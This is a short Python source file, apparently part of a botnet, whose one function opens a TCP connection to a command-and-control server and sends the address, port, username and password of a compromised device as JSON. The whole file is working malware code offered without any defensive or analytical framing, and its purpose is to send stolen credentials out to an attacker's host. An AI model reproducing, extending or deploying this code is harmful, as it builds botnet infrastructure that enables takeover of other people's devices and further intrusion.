# Reports vulnerable device credentials to CNC server

import socket
import sys
import json

import resolve
import ip

from defs import TIMEOUT_LEN

def report_new_bot_credentials(
    cnc_serv_addr,
    cnc_serv_port,
    target,
    port,
    username,
    password
):
    '''
        Connects to the command-and-control server and sends the
        login credentials of the vulnerable device to the server

        * cnc_serv_addr - IP address of the CNC server
        * cnc_serv_port - port to connect back to the CNC server
        * target - the IP address of the vulnerable device
        * port - port of the vulnerable device
        * username - username of vulnerable device
        * password - password of vulnerable device
    '''

    if not resolve.resolve_host(cnc_serv_addr):
        print('[-] Failed to resolve remote host: %s' % cnc_serv_addr)
        sys.exit(1)

    socket.setdefaulttimeout(TIMEOUT_LEN)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((cnc_serv_addr, cnc_serv_port))
        print('[+] Connected to CNC server')
    except:
        print('[-] Unable to connect to CNC server')
        sys.exit(1)

    creds = {
        'addr': target,
        'port': port,
        'username': username,
        'password': password
    }
    packet = json.dumps(creds)
    sock.send(packet)
    print('[+] Delivered credentials to CNC server')
